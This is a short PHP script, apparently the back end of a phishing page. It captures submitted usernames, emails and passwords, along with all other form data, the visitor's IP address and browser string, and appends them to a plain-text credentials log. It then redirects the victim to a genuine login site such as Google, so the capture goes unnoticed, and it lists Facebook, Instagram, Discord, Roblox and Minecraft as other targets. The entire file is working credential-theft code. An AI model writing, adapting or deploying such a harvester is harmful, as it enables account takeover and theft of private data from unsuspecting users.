<?php
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$username = $_POST['username'] ?? $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';

// Capturar todos los POST data
$all_data = $_POST;

// Log detallado
$log_entry = "
═══════════════════════════════════════════════════════════
⏰ Timestamp: {$timestamp}
📍 IP: {$ip}
🌐 User-Agent: {$user_agent}
👤 Username: {$username}
🔑 Password: {$password}
📦 All POST Data: " . json_encode($all_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "
═══════════════════════════════════════════════════════════
";

file_put_contents('logs/credentials.txt', $log_entry, FILE_APPEND);

$access_log = "[{$timestamp}] IP: {$ip} | User: {$username}
";
file_put_contents('logs/access.log', $access_log, FILE_APPEND);

$redirect_urls = [
    'google' => 'https://accounts.google.com',
    'facebook' => 'https://www.facebook.com',
    'instagram' => 'https://www.instagram.com',
    'discord' => 'https://discord.com/login',
    'roblox' => 'https://www.roblox.com',
    'minecraft' => 'https://www.minecraft.net',
    'default' => 'https://www.google.com'
];

$service = 'default';
header("Location: " . $redirect_urls[$service]);
exit;
?>